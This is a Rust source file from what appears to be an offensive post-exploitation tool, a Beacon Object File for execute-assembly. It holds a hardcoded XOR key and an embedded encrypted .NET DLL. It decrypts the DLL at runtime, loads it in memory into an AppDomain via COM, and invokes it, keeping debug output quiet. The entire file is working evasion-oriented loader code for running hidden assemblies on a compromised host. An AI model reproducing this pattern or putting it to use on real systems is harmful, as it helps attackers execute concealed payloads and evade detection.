//! NLogConfigHelper.exe asset + invoke helper. Decrypted at runtime and
//! loaded into the same AppDomain as the user assembly so its
//! AssemblyLoad event handler catches the user assembly load.

use alloc::vec::Vec;
use opsec_com::appdomain::AppDomain;
use opsec_com::comptr::ComPtr;

const NLOG_KEY: [u8; 16] = [
    0xA9, 0x3F, 0x17, 0xC4, 0xEE, 0x0B, 0x8D, 0x51,
    0x22, 0x6A, 0x7F, 0x04, 0x9C, 0xB3, 0xE7, 0x56,
];
const NLOG_XOR: &[u8] = include_bytes!("../../../bofs/senjata-execute-assembly/assets/nlog.dll.xor");

pub fn decrypt_nlog() -> Vec<u8> {
    NLOG_XOR
        .iter()
        .enumerate()
        .map(|(i, &b)| b ^ NLOG_KEY[i % NLOG_KEY.len()])
        .collect()
}

/// Load NLogConfigHelper into the given AppDomain. Best-effort: on failure,
/// log a debug message and continue — NLog tooling support degrades to the
/// pre-helper behaviour rather than aborting the run.
pub fn do_nlog_config(domain: &ComPtr<AppDomain>) {
    let bytes = decrypt_nlog();
    match unsafe { crate::netfx::load_assembly(domain, &bytes) } {
        Ok(asm) => {
            match unsafe { crate::netfx::invoke(&asm, "", 0) } {
                Ok(()) => {
                    #[cfg(feature = "debug-io")]
                    rustbof::eprintln!("[dbg] nlog cfg ok");
                }
                Err(_e) => {
                    #[cfg(feature = "debug-io")]
                    rustbof::eprintln!("[dbg] nlog cfg invoke err: {}", _e.format());
                }
            }
        }
        Err(_e) => {
            #[cfg(feature = "debug-io")]
            rustbof::eprintln!("[dbg] nlog cfg load err: {}", _e.format());
        }
    }
}
